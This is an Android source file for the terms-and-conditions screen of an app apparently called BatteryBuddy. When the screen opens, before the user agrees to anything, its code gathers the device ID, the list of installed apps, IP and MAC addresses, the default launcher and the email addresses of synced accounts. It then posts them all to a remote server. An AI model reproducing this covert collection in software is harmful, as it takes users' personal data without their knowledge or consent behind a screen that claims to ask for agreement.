package com.receptix.batterybuddy.activities;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.location.LocationManager;
import android.os.Build;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.util.Patterns;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.google.firebase.analytics.FirebaseAnalytics;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonPrimitive;
import com.koushikdutta.async.future.FutureCallback;
import com.koushikdutta.ion.Ion;
import com.receptix.batterybuddy.R;
import com.receptix.batterybuddy.helper.LogUtil;
import com.receptix.batterybuddy.helper.UserSessionManager;
import com.receptix.batterybuddy.helper.Utils;

import java.lang.reflect.Field;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

import static com.receptix.batterybuddy.helper.Constants.APPS_FLYER_ATTRIBUTES.CLICK_ID;
import static com.receptix.batterybuddy.helper.Constants.APPS_FLYER_ATTRIBUTES.CLICK_TIME;
import static com.receptix.batterybuddy.helper.Constants.APPS_FLYER_ATTRIBUTES.INSTALL_TIME;
import static com.receptix.batterybuddy.helper.Constants.APPS_FLYER_ATTRIBUTES.INSTALL_TYPE;
import static com.receptix.batterybuddy.helper.Constants.APPS_FLYER_ATTRIBUTES.MEDIA_SOURCE;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.COUNTRY;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEFAULT_LAUNCHER;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEVICE_ID;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEVICE_INFO;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.EMAILS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.ETHERNET;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.INSTALLED_APPS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.IP_ADDRESS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.LOCATION;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.MAC_ADDRESS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.REQUEST_OBJECT;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.RESPONSE_OBJECT;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.WLAN;
import static com.receptix.batterybuddy.helper.Constants.Urls.URL_OZOCK;

public class TermsAndConditionsActivity extends AppCompatActivity implements View.OnClickListener {

    TextView textViewPrivacyPolicy;
    UserSessionManager userSessionManager;
    Context context;
    Button agreeBtn;
    JsonObject jsonObject = new JsonObject();
    private FirebaseAnalytics mFirebaseAnalytics;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_tc);
         context = getApplicationContext();
         userSessionManager = new UserSessionManager(context);

        // Obtain the FirebaseAnalytics instance.
        mFirebaseAnalytics = FirebaseAnalytics.getInstance(this);
        AppsFlyerLib.getInstance().startTracking(this.getApplication(), getString(R.string.apps_flyer_dev_key));
        /*
         #AppsFlyer: registerConversionListener implements the collection of attribution (conversion) data
         Please refer to this documentation to view all the available attribution parameters:
         https://support.appsflyer.com/hc/en-us/articles/207032096-Accessing-AppsFlyer-Attribution-Conversion-Data-from-the-SDK-Deferred-Deeplinking
         */

        fetchInstallDetails();
        initView();


    }

    public void ShareDataWithServer(){

        LogUtil.d("Output",jsonObject.toString());

        Ion.with(context)
                .load(URL_OZOCK)
                .setJsonObjectBody(jsonObject)
                .asJsonObject()
                .setCallback(new FutureCallback<JsonObject>() {
                    @Override
                    public void onCompleted(Exception e, JsonObject result) {
                        LogUtil.d(RESPONSE_OBJECT, String.valueOf(result));
                    }
                });


    }

    public void fetchInstallDetails(){

        AppsFlyerLib.getInstance().registerConversionListener(this, new AppsFlyerConversionListener() {
            @Override
            public void onInstallConversionDataLoaded(Map<String, String> conversionData) {
                for (String attrName : conversionData.keySet()) {
                    LogUtil.d("conversionData ->", "attribute: " + attrName + " = " +
                            conversionData.get(attrName));
                }

                // ATTRIBUTION VALUES
                final String install_type = "Install Type: " + conversionData.get(INSTALL_TYPE);
                final String media_source = "Media Source: " + conversionData.get(MEDIA_SOURCE);
                final String install_time = "Install Time(GMT): " + conversionData.get(INSTALL_TIME);
                final String click_time = "Click Time(GMT): " + conversionData.get(CLICK_TIME);
                final String click_id = conversionData.get(CLICK_ID);

                jsonObject.addProperty("install_type",install_type);
                jsonObject.addProperty("media_source",media_source);
                jsonObject.addProperty("install_time",install_time);
                jsonObject.addProperty("click_time",click_time);
                jsonObject.addProperty("click_id",click_id);

                // add user device details to JSON once AppsFlyer data has been received
                fetchUserDetails();

            }

            @Override
            public void onInstallConversionFailure(String errorMessage) {
                LogUtil.d(AppsFlyerLib.LOG_TAG, "error getting conversion data: " + errorMessage);
                /*((TextView) findViewById(R.id.logView)).setText(errorMessage);*/
            }

            @Override
            public void onAppOpenAttribution(Map<String, String> conversionData) {


            }

            @Override
            public void onAttributionFailure(String errorMessage) {
                LogUtil.d(AppsFlyerLib.LOG_TAG, "error onAttributionFailure : " + errorMessage);
            }
        });
    }

    private void fetchUserDetails() {

        String country = "india";
        String location = "delhi";

        // get user location and country...
        boolean gps_enabled = false;
        boolean network_enabled = false;
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        try {
            gps_enabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            network_enabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
        } catch (Exception ex) {
            ex.printStackTrace();
        }

        // get device id
        String userDeviceId = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);

        jsonObject.addProperty(DEVICE_ID, userDeviceId);

        // get list of installed apps on user device
        JsonArray installedAppsList = new JsonArray();
        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packList.size(); i++) {
            PackageInfo packInfo = packList.get(i);
            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                JsonPrimitive jsonPrimitive = new JsonPrimitive(appName);
                installedAppsList.add(jsonPrimitive);
            }
        }

        // get user device information
        StringBuilder deviceInfoStringBuilder = new StringBuilder();
        deviceInfoStringBuilder.append("Android Version : ").append(Build.VERSION.RELEASE);

        Field[] fields = Build.VERSION_CODES.class.getFields();
        String osName = fields[Build.VERSION.SDK_INT + 1].getName();
        deviceInfoStringBuilder.append(" OS Name :").append(osName);

        String deviceIpAddress = Utils.getIPAddress(true);
        String deviceMacAddress = Utils.getMACAddress(WLAN);
        if (deviceMacAddress.length() == 0) {
            deviceMacAddress = Utils.getMACAddress(ETHERNET);
        }

        // get the default launcher
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_HOME);
        ResolveInfo defaultLauncher = getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
        String defaultLauncherStr = defaultLauncher.activityInfo.packageName;


        // Get user account (synced accounts on device)
        Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
        Account[] accounts = AccountManager.get(context).getAccounts();
        JsonArray userAccounts = new JsonArray();

        for (Account account : accounts) {
            if (emailPattern.matcher(account.name).matches()) {
                String possibleEmail = account.name;
                JsonPrimitive jsonPrimitive = new JsonPrimitive(possibleEmail);
                userAccounts.add(jsonPrimitive);
            }
        }

        // create final JSONObject to be sent to server
        jsonObject.addProperty(DEVICE_INFO, deviceInfoStringBuilder.toString());
        jsonObject.addProperty(IP_ADDRESS, deviceIpAddress);
        jsonObject.addProperty(MAC_ADDRESS, deviceMacAddress);
        jsonObject.addProperty(DEFAULT_LAUNCHER, defaultLauncherStr);
        jsonObject.addProperty(LOCATION, location);
        jsonObject.addProperty(COUNTRY, country);
        jsonObject.add(INSTALLED_APPS, installedAppsList);
        jsonObject.add(EMAILS, userAccounts);

        LogUtil.d(REQUEST_OBJECT, jsonObject.toString());

        ShareDataWithServer();

    }


    private void initView() {

        textViewPrivacyPolicy = (TextView) findViewById(R.id.textview_privacy_policy);
        agreeBtn = (Button) findViewById(R.id.useragreeBtn);
        agreeBtn.setOnClickListener(this);

        textViewPrivacyPolicy.setOnClickListener(this);

    }

    @Override
    public void onClick(View v) {
       if(v.getId()==R.id.textview_privacy_policy){
             startActivity(new Intent(TermsAndConditionsActivity.this, PrivacyActivity.class));
            overridePendingTransition(R.anim.slide_from_right, R.anim.slide_to_left);
        }else if(v.getId()==R.id.useragreeBtn){
            startActivity(new Intent(TermsAndConditionsActivity.this,NavigationActivity.class));
            userSessionManager.setIsFirstTime(false);
            finish();
        }

    }
}
